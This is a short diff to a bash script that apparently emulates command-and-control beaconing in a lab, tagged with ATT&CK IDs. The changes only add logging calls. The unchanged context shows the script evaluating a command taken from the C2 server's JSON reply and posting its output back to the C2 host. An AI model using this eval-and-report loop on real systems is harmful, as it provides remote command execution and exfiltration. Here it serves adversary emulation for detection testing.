@@ -43,6 +43,7 @@ for i in $(seq 1 "$BEACON_COUNT"); do
 
     if echo "$RESP" | grep -q 'echo decoy-task-executed'; then
         step "executing decoy task returned by C2 (ATT&CK T1059/T1105)"
+        act T1059 "eval C2-supplied task (echo decoy-task-executed)" "$LAB_NODE" "task decoy-task-0001"
         OUT="$(eval "$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task"]["command"])' 2>/dev/null)" 2>&1)"
         say "task output: $OUT"
         st_http POST "http://${C2_HOST}:${C2_PORT}/task-result" "task_id=decoy-task-0001 output=${OUT}" >/dev/null
@@ -57,3 +58,5 @@ done
 
 step "Done — ${BEACON_COUNT} beacons sent."
 say "artifacts: $LOG  (server-side log: results/control_api_beacons.log)"
+
+act_summary
